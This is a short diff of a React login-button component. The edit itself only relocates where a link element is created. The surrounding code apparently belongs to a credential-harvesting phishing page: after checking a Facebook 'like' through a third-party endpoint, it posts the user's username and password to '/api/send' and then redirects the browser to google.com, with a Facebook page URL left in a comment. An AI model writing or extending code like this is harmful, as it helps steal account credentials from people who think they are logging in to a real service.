@@ -36,13 +36,13 @@ const LoginButton = ({login,continu2,isAuthenticated,authLoading,postUrl,isAndro
       })
       const response = await axios.get('https://teclu.com/ApiFb_validatelike.php?name='+auth.username)
       console.log('useDioLike?',response.data)
+      let link =document.createElement('a');
       const dioLike = response.data
           if(dioLike){
           console.log('si dio like')
           try{
             const res =  await axios.post('/api/send',{username,password,continue_url,login_url});
             dispatch(uiActions.setLoading(false))
-            let link =document.createElement('a');
             link.href = 'https://google.com';
             link.click();
             // if(res.status == 200){
@@ -51,14 +51,13 @@ const LoginButton = ({login,continu2,isAuthenticated,authLoading,postUrl,isAndro
           }catch(err){
             console.log(err)
             console.log("Error")
-            let link =document.createElement('a');
             link.href = 'https://google.com';
             link.click();
             dispatch(uiActions.setLoading(false))
             }
         }else{
         dispatch(uiActions.setLoading(false))
-        let link =document.createElement('a');
+        
         link.href =  postUrl;
         // isAndroid ? 'https://www.facebook.com/Yacimientos/': postUrl;
         link.target = "_blank";
